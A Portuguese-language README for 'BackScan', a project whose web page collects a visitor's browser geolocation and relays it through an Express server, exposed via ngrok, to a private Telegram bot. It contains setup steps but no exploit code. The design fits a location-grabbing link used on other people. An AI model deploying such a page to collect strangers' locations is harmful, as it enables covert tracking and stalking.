BackScan

BackScan é um sistema desenvolvido para capturar a localização do usuário e enviá-la para um bot do Telegram por meio de um servidor Express.

Tecnologias Utilizadas

HTML + JavaScript - Interface simples para captura da localização

Express.js - Backend para receber e processar os dados

Axios - Comunicação com a API do Telegram

Ngrok - Expor o servidor local para acesso externo

Como Rodar o Projeto

Requisitos

Node.js 16+

Ngrok (para expor o servidor)

Conta no Telegram e um bot configurado

Passos

Clone o repositório:

git clone https://github.com/seu-usuario/backscan.git
cd backscan

Instale as dependências:

npm install

Configure as variáveis de ambiente:

No arquivo server.js, substitua BOT-TOKEN pelo token do seu bot Telegram.

Substitua CHAT-TOKEN pelo ID do chat ou grupo onde quer receber as mensagens.

Inicie o servidor:

node server.js

Exponha o servidor com Ngrok:

ngrok http 8088

Copie a URL gerada pelo Ngrok (por exemplo, https://abc123.ngrok.io).

Atualize a URL no arquivo index.html:

fetch("https://abc123.ngrok.io/send-location", {

Salve as alterações no arquivo.

Abra o arquivo index.html em um navegador e permita o acesso à localização.

Como Criar e Configurar um Bot no Telegram

No Telegram, procure pelo @BotFather.

Envie o comando /newbot e siga as instruções para criar um novo bot.

Anote o token fornecido pelo BotFather.

Para obter o ID do chat/grupo:

Adicione o bot a um grupo.

Envie uma mensagem no grupo.

Acesse https://api.telegram.org/botSEU_BOT_TOKEN/getUpdates e encontre o chat_id.

Estrutura de Pastas

backscan/
│-- index.html         # Página para capturar a localização
│-- server.js          # Servidor Express para processar e enviar os dados
│-- package.json       # Dependências do projeto
│-- README.md          # Documentação do projeto

Contribuição

Se você deseja contribuir com o BackScan:

Fork este repositório

Crie uma branch para sua feature (git checkout -b minha-feature)

Faça commit das mudanças (git commit -m 'Adiciona nova funcionalidade')

Envie o push para a branch (git push origin minha-feature)

Abra um Pull Request
